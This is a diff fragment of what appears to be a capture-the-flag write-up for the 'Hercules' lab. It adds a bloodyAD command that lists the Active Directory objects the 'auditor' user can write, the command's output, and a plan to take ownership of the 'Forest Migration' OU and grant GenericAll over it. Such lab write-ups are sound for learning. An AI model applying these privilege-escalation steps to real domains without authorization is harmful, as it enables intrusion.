@@ -1042,8 +1042,26 @@ I first had to generate a krb5 config file and get the TGT for the auditor and e
 # Writable objects as `auditor`
 
 ```python
+bloodyAD --host dc.hercules.htb -d hercules.htb -k get writable        
 
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=hercules,DC=htb
+permission: WRITE
+
+distinguishedName: OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
+permission: CREATE_CHILD; WRITE
+OWNER: WRITE
+DACL: WRITE
+
+distinguishedName: CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
+permission: WRITE
+
+distinguishedName: DC=_msdcs.hercules.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=hercules,DC=htb
+permission: CREATE_CHILD
 ```
+
+This user has interesting permissions on the `Forest Migration` OU, i should be able to take ownership and grant GenericAll over the OU
+
+
 
 
 
